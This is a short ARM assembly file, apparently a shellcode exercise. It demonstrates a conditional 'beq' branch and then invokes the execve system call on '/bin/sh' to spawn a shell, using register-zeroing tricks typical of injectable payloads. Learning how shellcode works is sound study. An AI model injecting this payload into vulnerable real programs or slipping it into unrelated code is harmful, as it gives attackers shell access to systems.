.section .text
.globl _start
_start:
	# executing 'b' instruction with 'eq' (equal)
	# condition flag.
	eor r1, r1, r1
	cmp r1, r1
	beq .foo

.foo:
	ldr   r4, =.shell
	stmdb sp!, {r4, r7, pc}
	ldmia sp!, {r0, r8, r9}
	eor   r1, r1, r1
	eor   r2, r2, r2
	eor   r7, r7, r7
	adds  r7, #11
	svc   #0

.shell:
	.asciz "/bin/sh"
